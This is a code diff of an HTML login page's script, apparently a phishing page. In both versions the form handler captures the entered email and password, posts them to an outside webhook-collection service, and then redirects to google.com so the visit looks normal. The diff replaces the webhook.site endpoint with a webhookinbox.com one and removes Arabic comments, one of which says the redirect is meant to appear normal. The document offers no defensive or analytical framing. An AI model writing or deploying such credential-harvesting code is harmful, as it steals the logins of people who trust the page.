@@ -64,31 +64,27 @@
     </form>
   </div>
 
-  <script>
-    document.getElementById('loginForm').addEventListener('submit', function (e) {
-      e.preventDefault(); // علشان ميعملش reload
+<script>
+  document.getElementById('loginForm').addEventListener('submit', function (e) {
+    e.preventDefault();
 
-      const email = document.getElementById('email').value;
-      const password = document.getElementById('password').value;
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
 
-      if (!email || !password) {
-        alert("Please fill in all fields.");
-        return;
-      }
-
-      fetch("https://webhook.site/#!/view/b48d6922-72c1-4099-9145-c3d4a2150b24", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({ email: email, password: password })
-      }).then(() => {
-        window.location.href = "https://google.com"; // redirect شكله طبيعي
-      }).catch((err) => {
-        alert("Something went wrong!");
-        console.error(err);
-      });
+    fetch("https://api.webhookinbox.com/i/mmNKZdRu/in/", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({ email: email, password: password })
+    }).then(() => {
+      window.location.href = "https://google.com";
+    }).catch((err) => {
+      alert("Something went wrong!");
+      console.error(err);
     });
-  </script>
+  });
+</script>
+
 </body>
 </html>
